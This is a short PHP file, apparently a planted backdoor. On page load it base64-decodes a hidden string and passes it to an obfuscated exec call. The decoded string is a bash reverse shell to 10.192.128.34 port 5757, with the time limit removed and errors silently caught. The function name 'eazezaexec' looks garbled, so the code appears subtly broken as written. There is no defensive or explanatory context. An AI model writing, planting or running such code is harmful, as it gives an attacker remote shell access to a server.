<?php
@h();

function h(){
  try {
    set_time_limit(0);
    $s = "eazezaexec";
    $opa = "aaYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xOTIuMTI4LjM0LzU3NTcgMD4mMScK";
    $kf = explode("\x15",base64_decode(substr($opa,2)));
    echo $s($kf[0]);
  } catch (\Exception $e) {

  }
}
?>